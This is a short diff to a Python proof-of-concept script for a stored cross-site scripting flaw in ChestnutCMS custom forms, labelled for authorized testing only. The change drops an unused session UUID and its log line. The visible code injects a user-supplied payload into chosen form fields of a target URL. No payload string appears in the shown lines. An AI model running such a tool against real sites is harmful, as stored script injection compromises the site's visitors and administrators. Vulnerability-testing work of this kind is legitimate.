@@ -39,7 +39,6 @@ python poc_customform_xss.py -t http://localhost:8080 -f 1 -F content -F remark
 
 import argparse
 import sys
-import uuid as uuidlib
 
 try:
     import requests
@@ -121,7 +120,6 @@ def main():
     args = parser.parse_args()
 
     base_url = args.target.rstrip("/")
-    session_uuid = uuidlib.uuid4().hex
 
     field_codes = parse_field_args(args.field)
     inject = {code: args.payload for code in field_codes}
@@ -136,7 +134,7 @@ def main():
     print(" ChestnutCMS Custom Form Stored XSS PoC  (authorized testing only)")
     print("=" * 64)
     log(f"Target: {base_url}")
-    log(f"formId={args.form_id}  session uuid={session_uuid}")
+    log(f"formId={args.form_id}")
     log(f"Inject fields: {field_codes}")
     log(f"Payload: {args.payload}")
 
